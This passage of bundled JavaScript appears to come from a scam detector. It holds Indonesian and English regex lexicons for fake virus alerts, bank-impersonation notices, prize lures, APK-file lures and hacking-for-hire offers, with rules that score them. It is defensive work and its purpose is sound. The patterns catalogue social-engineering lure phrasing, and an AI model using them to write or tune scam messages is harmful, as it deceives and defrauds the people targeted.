      `${B}(?:(?:komputer|pc|perangkat|hp|ponsel|laptop|browser)(?:\\s+(?:anda|kamu|mu|nya|bapak\\s*/\\s*ibu))?\\s+(?:telah\\s+|sudah\\s+|sedang\\s+)?(?:terinfeksi|diretas|dibajak|kena\\s+(?:virus|hack|retas)|terkunci|diblokir)|virus\\s+(?:terdeteksi|ditemukan)\\s+(?:di|pada)\\s+(?:perangkat|komputer|hp)|jangan\\s+(?:matikan|restart|tutup)\\s+(?:komputer|pc|halaman|jendela))${E}`,
      ["komputer Anda terinfeksi", "hp kamu kena virus", "virus terdeteksi di perangkat", "jangan matikan komputer"]
    ),
    entry4(
      "sup.id.alert_detected",
      "SW.ALERT",
      "id",
      "strong",
      `${B}(?:(?:telah\\s+|sudah\\s+)?mendeteksi\\s+(?:adanya\\s+)?(?:ancaman|virus|trojan|malware|spyware|serangan)|(?<!(?:tidak\\s+ada|tak\\s+ada|0)\\s)(?:ancaman|virus|trojan|malware|spyware)\\s+(?:telah\\s+|sudah\\s+)?terdeteksi)${E}`,
      ["telah mendeteksi ancaman", "virus terdeteksi"]
    ),
    entry4(
      "sup.en.threat",
      "ST.THREAT",
      "en",
      "weak",
      `${B}(?:(?:account|wallet|card|access|profile|data|files|license)\\s+(?:will\\s+be|has\\s+been|is\\s+being|may\\s+be)\\s+(?:permanently\\s+)?(?:suspended|locked|blocked|disabled|deactivated|closed|terminated|deleted|erased|frozen)|(?:lose|losing)\\s+(?:all\\s+)?(?:your\\s+)?(?:data|files|access|account))${E}`,
      ["account will be suspended", "data will be deleted", "lose all your files"]
    ),
    entry4(
      "sup.id.threat",
      "ST.THREAT",
      "id",
      "weak",
      `${B}(?:(?:akun|rekening|kartu|data|file|nomor)(?:nya|\\s+(?:anda|kamu|mu))?\\s+(?:akan\\s+|bakal\\s+|telah\\s+|sudah\\s+|mau\\s+)?(?:di)?(?:blokir|suspend|nonaktifkan|tutup|bekukan|hapus|banned)|kena\\s+(?:blokir|suspend|banned))${E}`,
      ["akun Anda akan diblokir", "akunnya bakal disuspend", "kena blokir"]
    ),
    // Account alarms used to open impersonated notices: an unfamiliar sign-in, an unrecognized transaction, a feature or tariff the
    // reader did not ask for (sup-0.4.0, D-091). Genuine notices raise them too; they count only with a claim and a lure.
    entry4(
      "sup.id.account_alarm",
      "SW.ACCOUNT",
      "id",
      "weak",
      `${B}(?:percobaan\\s+login|login\\s+(?:dari\\s+perangkat\\s+(?:lain|baru)|tidak\\s+(?:di\\s?)?kenal)|terdeteksi\\s+login|(?:aktivitas|tindakan|transaksi)\\s+(?:yang\\s+)?(?:tidak\\s+biasa|mencurigakan)|(?:trx|transaksi)\\s+(?:yang\\s+)?tidak\\s+(?:anda\\s+)?(?:kenal|kenali)|tidak\\s+merasa\\s+(?:melakukan|mengaktifkan|mengajukan)|perubahan\\s+(?:skema\\s+)?tarif|tarif\\s+baru)${E}`,
      ["Percobaan Login", "login tidak di kenal", "aktivitas tidak biasa", "Trx Tidak Anda Kenal", "tidak merasa mengaktifkan", "Perubahan Tarif"]
    ),
    entry4(
      "sup.en.account_alarm",
      "SW.ACCOUNT",
      "en",
      "weak",
      `${B}(?:(?:unusual|suspicious)\\s+(?:activity|sign-?in|login|transaction)|(?:sign-?in|login)\\s+attempt|unrecogni[sz]ed\\s+(?:transaction|purchase|charge|device|login)|(?:did\\s+not|didn['\u2019]t)\\s+(?:make|authori[sz]e|request)\\s+this)${E}`,
      ["unusual activity", "sign-in attempt", "unrecognized transaction", "didn't authorize this"]
    ),
    // A consequence that applies unless the reader answers, or a criminal penalty (sup-0.4.0).
    entry4(
      "sup.id.default_threat",
      "ST.THREAT",
      "id",
      "weak",
      `${B}(?:jika\\s+tidak\\s+ada\\s+(?:konfirmasi|balasan|jawaban)|(?:di\\s?)?anggap\\s+(?:setuju|aktif|menyetujui)|agar\\s+tidak\\s+(?:di\\s?)?(?:berlakukan|kenakan|bebankan)|sanksi\\s+pidana|(?:di\\s?)?pidana\\s+penjara|denda\\s+paling\\s+banyak|auto\\s*debet)${E}`,
      ["JIKA TIDAK ADA KONFIRMASI", "DI ANGGAP AKTIF", "agar tidak diberlakukan", "sanksi pidana", "di pidana penjara"]
    ),
    // A reward offered to start the exchange (points to redeem, vouchers, cash).
    entry4(
      "sup.id.reward",
      "SP.REWARD",
      "id",
      "weak",
      `${B}(?:poin\\s+(?:[\\p{L}]+\\s+){0,4}?(?:dapat|bisa)\\s+(?:di\\s?)?tukar(?:kan)?|tukar(?:kan)?\\s+poin|voucher\\s+belanja|uang\\s+tunai|hadiah\\s+(?:undian|langsung|uang))${E}`,
      ["poin Dapat di tukar", "voucher belanja", "uang tunai"]
    ),
    entry4(
      "sup.id.reward_chance",
      "SP.REWARD",
      "id",
      "weak",
      `${B}(?:berkesempatan\\s+(?:untuk\\s+)?(?:mendapatkan|memenangkan|meraih)\\s+(?:uang\\s+)?(?:tunai\\s+)?(?:rp\\.?\\s?\\d[\\d.,]*|hadiah|saldo)|hadiah\\s+(?:tahun\\s+baru|ulang\\s+tahun|hut|anniversary|lebaran|natal|spesial)|anniversary\\s+hadiah|bantuan\\s+(?:sosial|tunai)\\s+(?:sebesar\\s+)?rp)${E}`,
      ["berkesempatan mendapatkan Rp1500000", "Hadiah Tahun Baru", "anniversary Hadiah"]
    ),
    // Congratulating the reader on a prize they did not enter for.
    entry4(
      "sup.id.won",
      "SP.WON",
      "id",
      "weak",
      `${B}(?:selamat\\s*!|selamat\\s*[,!]?\\s*(?:anda|kamu|kak(?:ak)?)\\s+(?:terpilih|mendapatkan|memenangkan|berhak)|anda\\s+(?:terpilih|beruntung|berhak\\s+mendapatkan))`,
      ["Selamat!", "Selamat, Anda terpilih", "Anda berhak mendapatkan"]
    ),
    // SMS-style prize notices with abbreviations: a number "chosen" as winner, a winner's PIN (sup-0.6.0).
    entry4(
      "sup.id.won_sms",
      "SP.WON",
      "id",
      "weak",
      `${B}(?:(?:no(?:mor)?\\.?|norek|nmr|sim\\s*card|rekening|no\\.?\\s*id)\\s*(?:hp|tri|3care|anda|kamu|bpk|ibu|\\s)*(?:resmi\\s+|telah\\s+|t\\s*,\\s*)?${WIN_VERB}|selamat\\s*[,!]?\\s*(?:\\p{L}+\\s+){0,3}?(?:anda|kamu)\\s+(?:telah\\s+)?${WIN_VERB}|(?:sbg|sebagai)\\s+p(?:e)?menang|p(?:e)?menang\\s+ke\\s?-?\\s?\\(?\\d|hadiah\\s+ke\\s?-?\\s?\\(?(?:\\d|i+)|pin\\s*(?:p(?:e)?menang|anda|undian)|selamat\\s+no(?:mor)?\\.?)`,
      ["No anda Terpilih", "No.anda Terpilih M'dpt", "No anda tpilih mndpt", "Selamat anda m-dptkan", "sbg Pemenang", "Hadiah ke-I", "Pin Pmenang", "Norek anda terpilih", "SELAMAT No.HP"]
    ),
    entry4(
      "sup.id.reward_sms",
      "SP.REWARD",
      "id",
      "weak",
      `${B}(?:cek\\s+(?:tunai|rp|\\d)|(?:\\d+\\s*)?unit\\s+mobil|tabungan\\s+rp|hadiah|undian|${WIN_VERB}\\s+(?:hadiah|mobil|cek|uang|tabungan))`,
      ["Cek tunai", "Cek 35jt", "1 Unit MOBIL", "Tabungan Rp", "M-dpt Hadiah", "undian"]
    ),
    entry4("sup.en.won", "SP.WON", "en", "weak", `${B}(?:congratulations|you(?:['\u2019]ve|\\s+have)\\s+been\\s+selected|you\\s+are\\s+(?:our\\s+)?(?:lucky|selected))${E}`, ["Congratulations", "you've been selected"]),
    // An offer to get into someone else's messages, account or phone (sup-0.5.0): such services are illegal, and paying for
    // them is a common scam.
    entry4(
      "sup.id.illicit",
      "SO.ILLICIT",
      "id",
      "strong",
      `${B}(?:(?:jasa\\s+)?(?:sadap|menyadap|penyadap(?:an)?)\\s+(?:wa|whatsapp|hp|ponsel|telepon|chat|percakapan|akun)|jasa\\s+(?:sadap|hack(?:er)?|bobol|retas|peretas(?:an)?)|(?:hack|bobol|retas|bajak)\\s+akun\\s+(?:wa|whatsapp|ig|instagram|fb|facebook|tiktok|gmail|email|orang)|tanpa\\s+(?:sepengetahuan|diketahui)\\s+(?:target|pemilik|pasangan)|(?:hp|ponsel|nomor|akun)\\s+target)${E}`,
      ["jasa sadap WA", "menyadap WA", "hack akun IG", "tanpa sepengetahuan target", "HP target"]
    ),
    entry4(
      "sup.en.illicit",
      "SO.ILLICIT",
      "en",
      "strong",
      `${B}(?:(?:hack|spy\\s+on|monitor)\\s+(?:someone(?:['\u2019]s)?|any(?:one(?:['\u2019]s)?)?|your\\s+(?:partner|spouse)(?:['\u2019]s)?)\\s+(?:whats\\s?app|phone|account|messages)|hacker\\s+for\\s+hire|without\\s+(?:them|the\\s+target)\\s+knowing|target(?:['\u2019]s)?\\s+phone)${E}`,
      ["hack someone's WhatsApp", "hacker for hire", "without them knowing", "target's phone"]
    ),
    // A buyer or tenant who sends the reader to a relative or "proxy" to settle the price or payment (fake-buyer scams).
    entry4(
      "sup.id.proxy",
      "SO.PROXY",
      "id",
      "strong",
      `${B}(?:hub(?:ungi)?|tlp|telp|telepon|kontak|nego(?:siasi)?|bicarakan)\\.?\\s+(?:\\p{L}+\\s+){0,3}?(?:suami|istri|saudara|sodara|bapa|bapak|ayah|kakak|adik|om|paman)\\s+(?:sy|saya|aku)${E}`,
      ["hubungi suami saya", "hub saudara sy", "Mohon hub Bapa sy", "nego hrg silahkan Hub saudara sy"]
    ),
    entry4("sup.en.reward", "SP.REWARD", "en", "weak", `${B}(?:redeem\\s+(?:your\\s+)?points|reward\\s+points|cash\\s+prize|shopping\\s+voucher)${E}`, ["redeem your points", "cash prize"]),
    entry4(
      "sup.en.urgency",
      "SU.URGENCY",
      "en",
      "weak",
      `${B}(?:(?<!(?:expires?|valid\\s+for|valid)\\s)within\\s+\\d+\\s+(?:minutes?|mins?|hours?|hrs?)|immediately|right\\s+now|act\\s+now|urgent(?:ly)?|as\\s+soon\\s+as\\s+possible|asap|final\\s+warning)${E}`,
      ["immediately", "within 5 minutes", "urgent"]
    ),
    entry4(
      "sup.id.urgency",
      "SU.URGENCY",
      "id",
      "weak",
      `${B}(?:dalam\\s+(?:waktu\\s+)?\\d+\\s+(?:menit|jam)|segerah?|secepat\\s+mungkin|sekarang\\s+juga|secepatnya|buruan|cpt|cepetan|skrg\\s+juga|hari\\s+ini\\s+juga|peringatan\\s+terakhir)${E}`,
      ["segera", "buruan", "cpt", "dalam 10 menit"]
    )
  ], OWN_CONTEXT3 = [
    // Makes an alert a condition ("if your PC is infected") or something a message says ("a pop-up that says …"), not an assertion.
    entry4("sup.en.hypothetical", "SH.UNASSERTED", "en", "strong", `${B}(?:if|when|whenever|in\\s+case)${E}`, ["if", "when"]),
    entry4("sup.id.hypothetical", "SH.UNASSERTED", "id", "strong", `${B}(?:jika|jikalau|kalau|kalo|apabila|bila|seandainya)${E}`, ["jika", "kalau", "apabila"]),
    entry4(
      "sup.en.attributed",
      "SH.UNASSERTED",
      "en",
      "strong",
      `${B}(?:says|saying|said|claims?|claiming|warns?|warning\\s+that|states?|stating)(?:\\s+that)?${E}`,
      ["that says", "claiming", "warns that"]
    ),
    entry4(
      "sup.id.attributed",
      "SH.UNASSERTED",
      "id",
      "strong",
      `${B}(?:yang\\s+)?(?:menyatakan|mengatakan|bilang|menyebut(?:kan)?|mengklaim)(?:\\s+bahwa)?${E}`,
      ["yang menyatakan", "mengklaim", "bilang"]
    )
  ], AWARENESS = [
    entry4("sup.id.awareness", "C.EDUCATIONAL", "id", "strong", AWARENESS_ID, AWARENESS_ID_EXAMPLES),
    entry4("sup.id.impersonation_report", "C.REPORTED", "id", "strong", IMPERSONATION_REPORT_ID, IMPERSONATION_REPORT_ID_EXAMPLES)
  ], SHARED_CONTEXT3 = LEXICON.filter((e) => e.signal === "C.NEGATION" || e.signal === "C.REPORTED" || e.signal === "C.EDUCATIONAL").map((e) => ({ ...e, signal: e.signal })), SUPPORT_LEXICON = [...ACTIONS, ...CHANNELS, ...CLAIMS, ...PRESSURE2, ...OWN_CONTEXT3, ...AWARENESS, ...SHARED_CONTEXT3];

  // src/core/support/analyze.ts
  var SUPPORT_DETECTOR_VERSION = "sup-0.8.0-exp", CLAUSE_BREAK4 = new RegExp("[,;:!?]|\\.(?=\\s|$)|(?<![\\p{L}\\p{N}_])(?:and|then|or|but|dan|lalu|kemudian|atau|tapi|tetapi)(?![\\p{L}\\p{N}_])", "u"), NEGATION_BREAK = new RegExp("[,;:!?]|\\.(?=\\s|$)|(?<![\\p{L}\\p{N}_])(?:and|then|but|dan|lalu|kemudian|tapi|tetapi)(?![\\p{L}\\p{N}_])", "u"), SENTENCE_BREAK4 = /[!?]|\.(?=\s|$)/u, HYPOTHETICAL_MAX_GAP = 60, PHONE_DIGITS = [9, 15], TIERS4 = ["observed_instruction", "suspicious_correlation", "manipulative_instruction"], LEVELS4 = ["low", "medium", "high"], EDUCATIONAL4 = LEXICON.filter((e) => e.signal === "C.EDUCATIONAL"), ACTION_OF = { "SC.CONTACT": "contact", "SC.RESPOND": "respond", "SC.SURVEY": "survey", "SA.REMOTE": "remote-access", "SA.INSTALL": "install", "SA.DISABLE": "disable-protection" }, CHANNEL_OF = { "SX.PHONE": "phone", "SX.MOBILE": "mobile", "SX.MESSENGER": "messenger", "SX.LINK": "link", "SX.APK": "apk-file" }, CLAIM_OF = { "SI.SUPPORT": "support", "SI.BANK": "bank", "SI.ADMIN": "administrator", "SI.SECURITY": "security-team", "SI.OFFICIAL": "official", "SI.ORG": "organization" }, PRESSURE_OF2 = { "SW.ALERT": "system-alert", "SW.ACCOUNT": "account-alarm", "ST.THREAT": "threat", "SU.URGENCY": "urgency", "SP.REWARD": "reward", "SP.WON": "pre-won", "SO.ILLICIT": "illicit-access", "SO.PROXY": "third-party-redirect", "SD.DOCUMENT": "document-pretext" }, ORDER2 = [
    "contact",
    "respond",
    "survey",
    "remote-access",
    "install",
    "disable-protection",
    "phone",
    "mobile",
    "messenger",
    "link",
    "apk-file",
    "support",
    "bank",
    "administrator",
    "security-team",
    "official",
    "organization",
    "system-alert",
    "account-alarm",
    "threat",
    "urgency",
    "reward",
    "pre-won",
    "illicit-access",
    "third-party-redirect",
    "document-pretext",
    "page-rendered-system-alert",
    "alert-in-overlay",
    "remote-access-request",
    "software-install-request",
    "protection-disable-request",
    "apk-file-in-message",
    "personal-channel-contact",
    "claim-in-user-content"
  ], ordered2 = (xs) => [...new Set(xs)].sort((a, b) => ORDER2.indexOf(a) - ORDER2.indexOf(b)), SUPPORT_RULES = {
    SR1: { name: "FAKE_SYSTEM_ALERT_SUPPORT", classification: "manipulative_instruction" },
    SR2: { name: "IMPERSONATED_REMOTE_ACCESS_OR_INSTALL", classification: "manipulative_instruction" },
    SR3: { name: "SUPPORT_REDIRECT_UNDER_THREAT", classification: "manipulative_instruction" },
    SR4: { name: "CLAIMED_SUPPORT_IN_USER_CONTENT", classification: "manipulative_instruction" },
    SR5: { name: "OBSERVED_SUPPORT_DIRECTION", classification: "observed_instruction" },
    SR6: { name: "IMPERSONATED_NOTICE_LURE", classification: "manipulative_instruction" },
    SR7: { name: "PRIZE_SURVEY_LURE", classification: "manipulative_instruction" },
    SR8: { name: "ILLICIT_ACCESS_SERVICE", classification: "manipulative_instruction" },
    SR9: { name: "THIRD_PARTY_REDIRECT", classification: "manipulative_instruction" },
    SR10: { name: "APP_FILE_LURE", classification: "manipulative_instruction" }
  }, SUMMARY4 = {
    SR1: "The web page shows an alarm that the device is infected or locked and directs the reader to call a number, install software or allow remote access. Browsers and operating systems do not raise such alarms inside web pages.",
    SR2: "Someone presenting as support, a bank or an administrator asks the reader to install software or allow remote access, together with pressure, user-posted content or a personal contact channel.",
    SR3: "A claimed support, bank or administrator directs the reader to an outside contact together with a threat to the account or data, and urgency or a personal contact channel.",
    SR4: "A comment or other user-posted content presents itself as official support and directs the reader to an outside contact.",
    SR5: "A direction to contact support, install software or allow remote access was found with no impersonation or pressure signs nearby (for example, a help-center contact page).",
    SR6: "A message presented as a notice from a bank, e-wallet, marketplace or its support raises an account alarm, a threat or a reward and asks the reader to reply, choose an option, open a link or fill in a form. Banks and platforms do not settle such matters through a reply or a link in a chat or text message.",
    SR7: "The page congratulates the reader on a cash prize they did not enter for and asks them to answer a quiz or questionnaire, often in the name of a company's anniversary. Such quizzes are used to lead people to share the link or hand over data or money.",
    SR8: "The page offers to get into someone else's messages, account or phone and directs the reader to a contact. Such services are illegal, and buyers are commonly cheated or blackmailed.",
    SR9: "A stranger presenting as a buyer, tenant or landlord sends the reader to a relative or another person on a personal number to settle a price or payment. Fake-buyer and payment-redirect scams start this way.",
    SR10: "A message offers an Android app file (.apk) presented as an invitation, a parcel photo, a receipt, a ticket or a bill, or asks to install it or to turn off the device's protection. Opening such a file installs an app that can read text messages and take over banking apps."
  };
  function kindOfSignal3(s) {
    return s.startsWith("SC.") || s.startsWith("SA.") ? "action" : s.startsWith("SX.") ? "channel" : s.startsWith("SI.") ? "claim" : s.startsWith("SW.") || s.startsWith("ST.") || s.startsWith("SU.") || s.startsWith("SP.") || s.startsWith("SO.") || s.startsWith("SD.") ? "pressure" : "context";
  }
  function reportedText2(signal, text) {
    return signal === "SX.PHONE" || signal === "SX.MOBILE" || signal === "SX.LINK" ? "" : text.replace(/\d{5,}/gu, (d) => "\u2022".repeat(d.length)).replace(/@[\p{L}\p{N}_.]+/gu, "@\u2022");
  }
  function match3(src) {
    let raw = [];
    for (let entry5 of SUPPORT_LEXICON)
      for (let m of src.norm.text.matchAll(entry5.pattern)) {
        if (m[0].length === 0) continue;
        let signal = entry5.signal;
        if (signal === "SX.PHONE") {
          let digits = m[0].replace(/\D/gu, "");
          if (digits.length < PHONE_DIGITS[0] || digits.length > PHONE_DIGITS[1]) continue;
          /^(?:08|628)/u.test(digits) && (signal = "SX.MOBILE");
        }
        raw.push({ id: entry5.id, signal, strong: entry5.strength === "strong", s: m.index, e: m.index + m[0].length });
      }
    raw.sort((a, b) => Number(b.strong) - Number(a.strong) || a.s - b.s || b.e - a.e || a.id.localeCompare(b.id));
    let kept = /* @__PURE__ */ new Map(), out = [];
    for (let r of raw) {
      let spans = kept.get(r.signal) ?? [];
      if (spans.some(([s, e]) => r.s < e && s < r.e)) continue;
      spans.push([r.s, r.e]), kept.set(r.signal, spans);
      let range = toOriginalRange(src.norm, r.s, r.e);
      out.push({
        src,
        nStart: r.s,
        nEnd: r.e,
        o: {
          id: "",
          signal: r.signal,
          kind: kindOfSignal3(r.signal),
          entryId: r.id,
          blockId: src.block.id,
          start: range.start,
          end: range.end,
          text: reportedText2(r.signal, src.text.slice(range.start, range.end)),
          regionId: src.region.region.id,
          negated: !1,
          reported: !1
        }
      });
    }
    return out;
  }
  var precedes = (c, d, gap, br = CLAUSE_BREAK4) => c.src === d.src && c.nEnd <= d.nStart && d.nStart - c.nEnd <= gap && !br.test(d.src.norm.text.slice(c.nEnd, d.nStart));
  function bindContext3(signals, cues) {
    for (let d of signals) {
      let isAction = d.o.kind === "action" || d.o.signal === "SX.MESSENGER", isAlert = d.o.signal === "SW.ALERT";
      if (!isAction && !isAlert) continue;
      let neg = cues.filter((c) => c.o.signal === "C.NEGATION" && precedes(c, d, 40, NEGATION_BREAK) || isAlert && c.o.signal === "SH.UNASSERTED" && precedes(c, d, HYPOTHETICAL_MAX_GAP));
      if (neg.length > 0) {
        d.o.negated = !0, d.boundBy = neg[neg.length - 1];
        continue;
      }
      if (!isAction) continue;
      let rep = cues.find((c) => c.src === d.src && c.o.signal === "C.REPORTED" && c.nEnd <= d.nStart && !SENTENCE_BREAK4.test(d.src.norm.text.slice(c.nEnd, d.nStart)));
      if (!rep) {
        let region = d.src.region;
        for (let p = d.src.pos - 1; p >= 0 && d.src.pos - p < 8; p--) {
          let block = region.blocks[p];
          if (!(!block || !/:\s*$/u.test(block.text))) {
            rep = cues.find((c) => c.src.block === block && c.o.signal === "C.REPORTED");
            break;
          }
        }
      }
      rep && (d.o.reported = !0, d.boundBy = rep);
    }
  }
  function directionUnits(sources, signals) {
    let units = [];
    for (let src of sources) {
      let here = signals.filter((s) => s.src === src && !s.o.negated), isChannel = (s) => s.o.kind === "channel" && s.o.signal !== "SX.APK", around = signals.filter((s) => s.src.region === src.region && Math.abs(s.src.pos - src.pos) === 1 && isChannel(s) && !s.o.negated), remoteOrInstall = here.filter((s) => s.o.signal === "SA.REMOTE" || s.o.signal === "SA.INSTALL" || s.o.signal === "SA.DISABLE" || s.o.signal === "SC.RESPOND" || s.o.signal === "SC.SURVEY"), links = here.filter((s) => s.o.signal === "SX.LINK" || s.o.signal === "SX.APK"), contacts = here.filter((s) => s.o.signal === "SC.CONTACT"), channelsHere = here.filter((s) => isChannel(s) && s.o.signal !== "SX.LINK" && s.o.signal !== "SX.APK"), channels = channelsHere.length > 0 ? channelsHere : contacts.length > 0 ? around : [], numberHere = channelsHere.some((s) => s.o.signal !== "SX.MESSENGER"), messengerWithNumber = channelsHere.some((s) => s.o.signal === "SX.MESSENGER") && numberHere, actions = [...remoteOrInstall, ...channels.length > 0 && (contacts.length > 0 || messengerWithNumber) ? contacts : []];
      actions.length === 0 && !messengerWithNumber && links.length === 0 || units.push({ src, actions, channels: [...actions.some((a) => a.o.signal === "SC.CONTACT") || messengerWithNumber ? channels : [], ...links] });
    }
    return units;
  }
  function containerKind3(src) {
    let id = src.block.containerId;
    return id.slice(0, id.indexOf(":") + 1);
  }
  function trustOf3(src) {
    let ctx = src.block.ctx ?? {}, kind = containerKind3(src), out = [];
    return (kind === "ugc:" || ctx.ugc) && out.push("user-content"), kind === "widget:" && out.push("third-party-widget"), kind === "frame:" && out.push("embedded-frame"), (kind === "dialog:" || ctx.dialog) && out.push("dialog"), (kind === "overlay:" || ctx.overlay) && out.push("overlay"), ctx.form && out.push("form"), out;
  }
  var UNTRUSTED3 = ["user-content", "third-party-widget", "embedded-frame"], near3 = (src, u) => src.region === u.src.region && Math.abs(src.pos - u.src.pos) < 8, inQuoteOrCode3 = (src) => !!(src.block.ctx?.quote || src.block.ctx?.code || src.block.ctx?.pre);
  function headingEducational3(heading) {
    if (!heading) return !1;
    let text = normalize(heading).text;
    return EDUCATIONAL4.some((e) => [...text.matchAll(e.pattern)].length > 0);
  }
  var RULE_RANK4 = { SR1: 0, SR2: 1, SR10: 2, SR3: 3, SR4: 4, SR6: 5, SR7: 6, SR8: 7, SR9: 8, SR5: 9 };
  function scoreOne3(u, region, signals, cues) {
    let nearby = signals.filter((p) => (p.o.kind === "claim" || p.o.kind === "pressure") && !p.o.negated && near3(p.src, u) && (!inQuoteOrCode3(p.src) || p.src === u.src)), alerts = nearby.filter((p) => p.o.signal === "SW.ALERT"), threats = nearby.filter((p) => p.o.signal === "ST.THREAT"), urgency = nearby.filter((p) => p.o.signal === "SU.URGENCY"), claims = nearby.filter((p) => p.o.kind === "claim"), actions = ordered2(u.actions.map((a) => ACTION_OF[a.o.signal])), channels = ordered2(u.channels.map((c) => CHANNEL_OF[c.o.signal])), contact = u.channels.some((c) => c.o.signal !== "SX.LINK" && c.o.signal !== "SX.APK"), lure = actions.includes("respond") || channels.includes("link"), accountAlarms = nearby.filter((p) => p.o.signal === "SW.ACCOUNT"), rewards = nearby.filter((p) => p.o.signal === "SP.REWARD"), won = nearby.filter((p) => p.o.signal === "SP.WON"), illicit = nearby.filter((p) => p.o.signal === "SO.ILLICIT"), proxy = nearby.filter((p) => p.o.signal === "SO.PROXY"), remote = actions.includes("remote-access"), install = actions.includes("install"), disable = actions.includes("disable-protection"), apk = channels.includes("apk-file"), documents = nearby.filter((p) => p.o.signal === "SD.DOCUMENT"), personal = channels.includes("mobile") || channels.includes("messenger"), trust = trustOf3(u.src), ugc = trust.includes("user-content"), untrusted = trust.some((t2) => UNTRUSTED3.includes(t2)), hasClaim = claims.length > 0, pressure = [...claims, ...threats, ...urgency], candidates = [];
    if (alerts.length > 0 && (contact || remote || install || disable) && candidates.push(["SR1", "manipulative_instruction", [...alerts, ...pressure]]), (remote || install || disable) && hasClaim && (threats.length > 0 || urgency.length > 0 || untrusted || personal) && candidates.push(["SR2", threats.length > 0 || (remote || disable) && (urgency.length > 0 || ugc) ? "manipulative_instruction" : "suspicious_correlation", pressure]), contact && hasClaim && threats.length > 0 && (personal || urgency.length > 0) && candidates.push(["SR3", personal && urgency.length > 0 ? "manipulative_instruction" : "suspicious_correlation", pressure]), contact && ugc && claims.some((c) => trustOf3(c.src).includes("user-content")) && candidates.push(["SR4", threats.length > 0 || urgency.length > 0 ? "manipulative_instruction" : "suspicious_correlation", pressure]), lure && hasClaim && (untrusted || personal) && (accountAlarms.length > 0 || threats.length > 0 || rewards.length > 0)) {
      let strong = (accountAlarms.length > 0 || threats.length > 0) && (urgency.length > 0 || personal || ugc || accountAlarms.length > 0 && threats.length > 0);
      candidates.push(["SR6", strong ? "manipulative_instruction" : "suspicious_correlation", [...pressure, ...accountAlarms, ...rewards]]);
    }
    if ((actions.includes("survey") || lure || contact) && won.length > 0 && rewards.length > 0 && candidates.push(["SR7", hasClaim || untrusted ? "manipulative_instruction" : "suspicious_correlation", [...claims, ...won, ...rewards, ...urgency]]), illicit.length > 0 && (contact || actions.includes("respond")) && candidates.push(["SR8", urgency.length > 0 || personal ? "manipulative_instruction" : "suspicious_correlation", [...illicit, ...urgency]]), proxy.length > 0 && personal && candidates.push(["SR9", urgency.length > 0 || threats.length > 0 ? "manipulative_instruction" : "suspicious_correlation", [...proxy, ...urgency, ...threats]]), (apk || disable) && (untrusted || personal)) {
      let lured = apk && (documents.length > 0 || disable) || hasClaim || urgency.length > 0 || threats.length > 0 || alerts.length > 0;
      (lured || install || disable) && candidates.push(["SR10", lured ? "manipulative_instruction" : "suspicious_correlation", [...documents, ...pressure, ...alerts]]);
    }
    let [ruleId, cls, used] = candidates.sort((x, y) => TIERS4.indexOf(y[1]) - TIERS4.indexOf(x[1]) || RULE_RANK4[x[0]] - RULE_RANK4[y[0]])[0] ?? ["SR5", "observed_instruction", []], base = cls === "suspicious_correlation" ? "medium" : "high", anchor = u.actions[0] ?? u.channels[0], mods = [];
    u.src.block.ctx?.quote && mods.push({ id: "C.QUOTED", demoteBy: 2, reason: "The direction is inside a quotation.", evidence: [anchor] });
    let reported = u.actions.find((a) => a.o.reported);
    reported && mods.push({
      id: "C.REPORTED",
      demoteBy: 2,
      reason: "The text reports what someone else was told to do rather than directing the reader.",
      evidence: reported.boundBy ? [reported.boundBy] : []
    }), (u.src.block.ctx?.code || u.src.block.ctx?.pre) && mods.push({ id: "C.CODE_EXAMPLE", demoteBy: 2, reason: "The direction is inside a code sample.", evidence: [`block:${u.src.block.id}`] });
    let eduCues = cues.filter((c) => c.o.signal === "C.EDUCATIONAL" && near3(c.src, u)), eduHeading = headingEducational3(u.src.block.headingContext) ? [`heading:${u.src.block.id}`] : [];
    (eduCues.length > 0 || eduHeading.length > 0) && mods.push({ id: "C.EDUCATIONAL", demoteBy: 1, reason: "The surrounding text is educational or awareness material.", evidence: [...eduCues, ...eduHeading] });
    let demotion = Math.min(2, mods.reduce((n, m) => n + m.demoteBy, 0)), context = [...new Set(used)], indicators = [], usedAlerts = context.filter((o) => o.o.signal === "SW.ALERT");
    return usedAlerts.length > 0 && indicators.push("page-rendered-system-alert"), usedAlerts.some((o) => trustOf3(o.src).some((t2) => t2 === "overlay" || t2 === "dialog")) && indicators.push("alert-in-overlay"), remote && indicators.push("remote-access-request"), install && indicators.push("software-install-request"), disable && indicators.push("protection-disable-request"), apk && (untrusted || personal) && indicators.push("apk-file-in-message"), hasClaim && personal && indicators.push("personal-channel-contact"), claims.some((c) => trustOf3(c.src).includes("user-content")) && indicators.push("claim-in-user-content"), {
      units: [u],
      region,
      ruleId,
      ruleClassification: cls,
      modifiers: mods,
      context,
      actions,
      channels,
      classification: TIERS4[Math.max(0, TIERS4.indexOf(cls) - demotion)],
      confidence: LEVELS4[Math.max(0, LEVELS4.indexOf(base) - mods.length)],
      claims: ordered2(claims.map((c) => CLAIM_OF[c.o.signal])),
      indicators: ordered2(indicators),
      pressures: ordered2(context.flatMap((o) => PRESSURE_OF2[o.o.signal] ? [PRESSURE_OF2[o.o.signal]] : []))
    };
  }
  function score3(units, region, signals, cues) {
    let scored = units.map((u) => scoreOne3(u, region, signals, cues));
    return {
      ...[...scored].sort((a, b) => TIERS4.indexOf(b.classification) - TIERS4.indexOf(a.classification) || RULE_RANK4[a.ruleId] - RULE_RANK4[b.ruleId])[0],
      units,
      actions: ordered2(scored.flatMap((x) => x.actions)),
      channels: ordered2(scored.flatMap((x) => x.channels))
    };
  }
  function cluster3(units) {
    let sorted = [...units].sort((a, b) => a.src.region.index - b.src.region.index || a.src.pos - b.src.pos), out = [];
    for (let u of sorted) {
      let last = out[out.length - 1];
      last && last.region === u.src.region && u.src.pos - last.units[0].src.pos < 8 ? last.units.push(u) : out.push({ region: u.src.region, units: [u] });
    }
    return out;
  }
  function analyzeSupport(snapshot) {
    let sources = buildRegions(snapshot.blocks.slice(0, 5e3)).flatMap((r) => r.blocks.map((b, i) => {
      let text = b.text.slice(0, 2e3);
      return { block: b, text, norm: normalize(text), region: r, pos: i };
    })), signals = [], cues = [];
    for (let src of sources)
      for (let ob of match3(src)) (ob.o.kind === "context" ? cues : signals).push(ob);
    bindContext3(signals, cues);
    let linkOnly = (u) => u.actions.every((a) => a.o.signal === "SC.RESPOND" || a.o.signal === "SC.SURVEY") && u.channels.every((c) => c.o.signal === "SX.LINK"), scored = cluster3(directionUnits(sources, signals)).map((c) => score3(c.units, c.region, signals, cues)).filter((s) => !(s.ruleId === "SR5" && s.units.every(linkOnly))), used = /* @__PURE__ */ new Set();
    for (let s of scored) {
